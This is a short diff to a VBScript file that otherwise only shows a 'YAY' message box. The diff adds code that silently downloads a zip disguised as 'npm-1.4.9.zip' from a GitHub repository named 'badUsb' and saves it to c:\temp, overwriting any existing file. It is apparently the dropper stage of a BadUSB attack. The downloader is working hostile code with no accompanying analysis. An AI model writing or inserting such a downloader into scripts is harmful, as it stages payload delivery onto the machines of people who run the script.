@@ -1,1 +1,13 @@
 MsgBox("YAY")
+
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "https://github.com/nerothe/badUsb/raw/master/npm-1.4.9.zip", False
+xHttp.Send
+
+with bStrm
+    .type = 1 '//binary
+    .open
+    .write xHttp.responseBody
+    .savetofile "c:\temp\npm-1.4.9.zip", 2 '//overwrite
+end with
